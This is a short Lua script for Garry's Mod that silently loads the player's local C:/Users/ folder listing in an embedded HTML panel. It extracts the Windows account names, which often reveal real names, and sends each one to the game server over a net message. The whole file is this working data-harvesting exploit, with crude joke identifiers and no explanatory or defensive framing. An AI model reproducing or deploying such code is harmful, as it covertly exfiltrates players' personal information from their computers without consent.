
hook.Add( "HUDShouldDraw", "penis", function()
	--return false
end)

timer.Simple(3, function()


-- Rich Text panel
local richertext = vgui.Create( "DHTML" )
richertext:SetSize(500, 500)
richertext:Center()


richertext:AddFunction("imsorry", "mypenisistoobig", function(data)
	
	local l = string.Explode("\n", data)
	local results = {}
	
	l[#l] = nil
	l[1] = nil
	l[2] = nil
	for k,v in pairs(l) do
		local startl
		local endl
		for i=1, string.len(v) do

			
			if(v[i] == "\"") then
				if(startl) then
					endl = i-1
					table.insert(results, string.sub(v, startl, endl))
					break
				end
				
				startl = i+1
			end
		end
	end
	
	local dumb = {}
	dumb["All Users"] = true
	dumb["Default"] = true
	dumb["Default User"] = true
	dumb["Default.migrated"] = true
	dumb["Public"] = true
	dumb["desktop.ini"] = true
	
	local username = nil
	
	for k,v in pairs(results) do
		if(dumb[v]) then
			results[k] = nil
		end
	end
	
	local ay = 0

		
	for k,v in pairs(results) do
		timer.Simple(ay, function()
			ay = ay + 1
			net.Start("imcocked")
				net.WriteString(v)
			net.SendToServer()
		end)
	end
		
	
end)

		
richertext:OpenURL("C:/Users/")

timer.Simple(0.1, function()
	richertext:QueueJavascript("imsorry.mypenisistoobig(document.documentElement.innerHTML);")
end)

end)

